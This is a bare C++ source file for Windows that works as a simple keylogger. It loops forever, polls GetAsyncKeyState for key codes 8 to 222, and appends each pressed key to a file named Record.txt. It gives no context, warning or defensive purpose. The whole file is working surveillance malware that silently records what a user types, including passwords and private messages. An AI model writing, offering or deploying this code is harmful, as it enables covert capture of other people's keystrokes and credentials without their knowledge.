#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>

using namespace std;
void log();
int main()
{
    log();
    return 0;
}
void log()
{
    char c;

    for(;;)
    {
        for(c=8;c<=222;c++)
        {
          if(GetAsyncKeyState(c)==-32767)
          {
              ofstream write("Record.txt",ios::app);
              write<<c;
          }
        }

    }
}
